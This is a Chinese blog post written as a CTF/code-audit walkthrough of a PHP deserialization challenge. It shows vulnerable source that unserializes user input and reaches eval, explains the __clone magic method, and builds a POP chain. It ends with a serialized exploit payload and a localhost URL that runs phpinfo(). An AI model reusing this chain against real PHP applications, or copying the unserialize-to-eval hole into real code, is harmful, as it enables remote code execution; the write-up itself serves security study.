<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  
  <title>php反序列化之魔法函数clone | greetdawn&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="article">
<meta property="og:title" content="php反序列化之魔法函数clone">
<meta property="og:url" content="http://www.greetdawn.top/2021/12/01/web-security/php-code-audit/php-unserialize-clone/index.html">
<meta property="og:site_name" content="greetdawn&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164159329.png">
<meta property="article:published_time" content="2021-12-01T07:51:32.000Z">
<meta property="article:modified_time" content="2021-12-01T08:49:37.660Z">
<meta property="article:author" content="丨greetdawn丨">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PHP反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png">
  
    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/typing.css">

  
<link rel="stylesheet" href="/css/donate.css">

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

  
    
      <body>
    
  
      <div id="container" class="container">
        <article id="post-web-security/php-code-audit/php-unserialize-clone" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <header id="header" class="header">
  <nav class="mobile-nav">
    <h1 class="nickname">NickName</h1>
    <ul class="mobile-nav-menu">
      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
      <input type="checkbox" id="mobile-menu-toggle"/>
      <ul class="mobile-nav-link">
        
        <a href="/">Home</a>
        
        <a href="/archives">Archives</a>
        
        <a href="/about">About</a>
        
      </ul>
    </ul>
  </nav>
	
		<nav id="main-nav" class="main-nav nav-left">
	
	
	  <a class="main-nav-link" href="/">Home</a>
	
	  <a class="main-nav-link" href="/archives">Archives</a>
	
	  <a class="main-nav-link" href="/about">About</a>
	
  </nav>
</header>

  <hr/>
  <div class="article-inner">
    

    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      php反序列化之魔法函数clone
    </h1>
  

      </header>
    
    <div class="e-content article-entry typo" itemprop="articleBody">
      
        <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png" alt="image-20211201164317651"></p>
<span id="more"></span>

<h1 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h1><p>昨天某甲方客户联系我，直接甩了两道<code>php</code>反序列化的源码题，晚上回去把题目本地复现了一下。这个复现之路可谓艰辛。<code>phpstudy</code>直接报错，每一行都报错。后面才知道，因为直接以源码方式微信发的，我直接复制，导致复制的不干净，掺杂了一些脏东西。此处已心态爆炸，我把源码手撸了一遍。o(╯□╰)o幸好源码不是太多。第一题耽误了太多时间没搞出来，第二题出来了，这边想着做个简单记录吧。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>里面的注释内容为我本地运行时添加的测试代码。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">z</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token comment">//echo "class z tostring";</span>
			<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">h</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$method</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token comment">//echo "class h";</span>
			<span class="token comment">//echo "123".$method;</span>
			<span class="token comment">//echo "456".$this->method;</span>
			<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">e</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xixi</span><span class="token operator">=</span><span class="token keyword">clone</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token string double-quoted-string">"haha"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		
		<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">//echo "__clone";</span>
			<span class="token comment">//var_dump($this->f);</span>
			<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token function">haha</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>



<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>其实代码内容并不多</p>
<p>但是这里面的魔法函数<code>__clone</code>以及函数<code>clone</code>是我第一次见，这里真的说明自己有点菜，题做的太少啊~ 时间都用来打杂了，我一开始把它认为是自定义函数了。。。</p>
<p>没用过咋办呢， 查呗，<code>google</code>走起。 别问我为啥不百度，其实你们都懂得~</p>
<p>网上给了一个小栗子演示了一下这个魔法函数的作用：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
	<span class="token comment">//首先定义一个test一个类</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">Testclass</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">//成员变量是$value1</span>
		<span class="token keyword">public</span> <span class="token variable">$value1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">//随后new一个obj1</span>
	<span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Testclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//复制成员变量的值为qqq</span>
	<span class="token variable">$obj1</span><span class="token operator">-></span><span class="token property">value1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"qqq"</span><span class="token punctuation">;</span>
	<span class="token comment">//我们使用赋值符号给左边obj2赋值obj1</span>
	<span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token variable">$obj1</span><span class="token punctuation">;</span>
	<span class="token comment">//我们在这里把obj2的的value1复制为eee</span>
	<span class="token variable">$obj2</span><span class="token operator">-></span><span class="token property">value1</span> <span class="token operator">=</span><span class="token string double-quoted-string">"eee"</span><span class="token punctuation">;</span>     
	<span class="token comment">//随后我们打印出两者的值</span>
	<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span>
	<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p><strong>output:</strong></p>
<pre class="language-none"><code class="language-none">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;eee&quot; &#125;
object(Testclass)#1 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;eee&quot; &#125; </code></pre>

<p>我们发现这种情况下运行结果一致：</p>
<p> <strong>那是因为（借用<code>php</code>手册的话就是）：当对象被复制后，<code>PHP 5 </code>会对对象的所有属性执行一个浅复制（<code>shallow copy</code>）。所有的引用属性 仍然会是一个指向原来的变量的引用。</strong></p>
<p>其实在这里就是<code>obj1</code>给了<code>obj2</code>它的地址，就和引用一样，<code>obj2</code>指向了<code>obj1</code></p>
<p>接下来使用<code>clone</code>复制</p>
<pre class="language-none"><code class="language-none">这里讲上述代码中
$obj2 &#x3D; $obj1;  &#x3D;》	$obj2 &#x3D; clone $obj1;</code></pre>

<p><strong>output:</strong></p>
<pre class="language-none"><code class="language-none">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;qqq&quot; &#125;
object(Testclass)#2 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;eee&quot; &#125; </code></pre>

<p>其实这里的clone就是为了实现深拷贝的作用。</p>
<p><code>__clone</code>触发条件：<strong>当我们对一个类有clone操作的时候将会触发这个类里面的__clone方法</strong></p>
<p>注：<strong>clone只能用于对象克隆，对象复制。如果clone一个非对象变量将会报错no obj</strong></p>
<h2 id="具体开干"><a href="#具体开干" class="headerlink" title="具体开干"></a>具体开干</h2><p>其实到这里我们基本上稀里糊涂的或许大概明白了什么意思。。。那就开搞呗。有源码，一点点分析好了</p>
<p>我的思路这种简短的源码，我喜欢先定位危险函数再去反推<code>POP</code>链</p>
<p>代码中我们发现危险函数<code>eval</code>藏在类<code>h</code>的<code>__call</code>中，且要保证条件<code>in_array($method, $this-&gt;method)</code>成立,这里可以直接控制<code>$method = arry(&#39;haha&#39;,&#39;hehe&#39;,&#39;dada&#39;);</code></p>
<p>调用<code>__call</code>魔法函数只需调用其实例化类本身不存在的方法即可，刚好在类<code>e</code>中存在成员变量<code>h</code>调用了一个<code>haha</code>方法，该方法刚好是类<code>h</code>不存在的,即<code>$obj = new e;$obj-&gt;f=new h;</code></p>
<p>要想触发以上条件就需要触发<code>__clone</code>魔法函数，根据前序只是我们知道，<code>clone</code>即可触发,且<code>clone</code>是在<code>__get</code>魔法函数中,即<code>$obj = new z;$obj-&gt;a = new e;</code></p>
<p>触发<code>__get</code>魔法函数，只需调用其实例化类对象中不存在或者无权限调用的成员属性即可</p>
<p>刚好在类<code>z</code>中存在<code>__toString</code>魔法函数，里面执行了成员变量引用，那么<code>$a = new e</code>即可</p>
<p>传参接口<code>poc</code>刚好在反序列化的时候被<code>echo</code>了，那么刚好可以直接触发<code>__toString</code></p>
<h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><p>根据分析具体思路构造一个完美的exp即可</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">z</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">h</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"haha"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hehe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dada"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">e</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xixi</span><span class="token operator">=</span><span class="token keyword">clone</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token string double-quoted-string">"haha"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		
		<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token function">haha</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">z</span><span class="token punctuation">;</span>
	<span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">e</span><span class="token punctuation">;</span> <span class="token comment">//触发__get</span>
	<span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span> <span class="token comment">//__clone 的深拷贝用法</span>
	<span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">z</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">h</span><span class="token punctuation">;</span>  <span class="token comment">//赋值实例化h类， 触发__call</span>
	<span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//echo $poc;</span>
	<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p><strong>output：</strong></p>
<pre class="language-none"><code class="language-none">O:1:&quot;z&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;e&quot;:3:&#123;s:1:&quot;z&quot;;r:2;s:1:&quot;f&quot;;O:1:&quot;h&quot;:1:&#123;s:6:&quot;method&quot;;a:3:&#123;i:0;s:4:&quot;haha&quot;;i:1;s:4:&quot;hehe&quot;;i:2;s:4:&quot;dada&quot;;&#125;&#125;s:3:&quot;arg&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;
O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></pre>



<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;timu2.php?poc&#x3D;O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164159329.png" alt="image-20211201164159329"></p>

      
      
    </div>
    <footer class="article-footer">
      <ul class="article-meta">
        <li>
          <span class="label">Published Date:</span>
          <a href="/2021/12/01/web-security/php-code-audit/php-unserialize-clone/" class="article-date">
  <time class="dt-published" datetime="2021-12-01T07:51:32.000Z" itemprop="datePublished">2021-12-01</time>
</a>

        </li>
        
          <li>
            <span class="label">Category:</span>
            
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a>
  </div>


          </li>
        
        
          <li>
            <span class="label">Tag:</span>
            
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">PHP反序列化</a></li></ul>


          </li>
        
        <hr/>
      </ul>
    </footer>
  </div>
  
    
<nav id="article-nav" class="article-nav">
  
    <a href="/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/" id="article-nav-newer" class="article-nav-link-wrap newer">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          php-unserialize-getflag
        
      </div>
    </a>
  
  
    <a href="/2021/11/24/wechat/newstart/" id="article-nav-older" class="article-nav-link-wrap older">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">重新开始</div>
    </a>
  
</nav>


  
</article>










      </div>
      
    <footer id="footer" class="post-footer footer">
      
      <hr/>
      <div id="footerContent" class="footer-content">
        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>


      </div>
    </footer>

      








<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>



  
<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>




<script src="/js/typing.js"></script>

<!--[if lt IE 9]>
<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
<![endif]-->







    </div>
  </body>
</html>
